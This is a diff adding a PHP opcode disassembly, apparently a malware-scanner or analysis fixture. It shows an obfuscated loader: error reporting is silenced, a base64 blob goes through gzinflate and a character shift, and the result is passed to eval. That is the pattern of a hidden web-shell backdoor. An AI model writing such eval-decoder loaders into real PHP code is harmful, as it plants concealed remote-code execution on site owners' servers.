@@ -1,0 +1,22 @@
+FunctionStart 
+INIT_FCALL 'error_reporting'
+DO_ICALL 
+INIT_FCALL 'danfa'
+SEND_VAL 'jVdZTxtXFP4tI8sStmSNZjybPVfT1oAxaQwmtqEhcWQZewAX42WwyUCElAXSlLa06ksfUqkPUfsakY3seY8qBx76C9Itb/0HPefca5g0hBRpmDn7ud9Z'
+DO_FCALL 
+INCLUDE_OR_EVAL 'EVAL'
+RETURN 1
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'gzinflate'
+INIT_FCALL 'base64_decode'
+DO_ICALL 
+DO_ICALL 
+INIT_FCALL 'chr'
+INIT_FCALL 'ord'
+DO_ICALL 
+SUB 1
+DO_ICALL 
+RETURN 
+RETURN 'null'
+FunctionEnd 
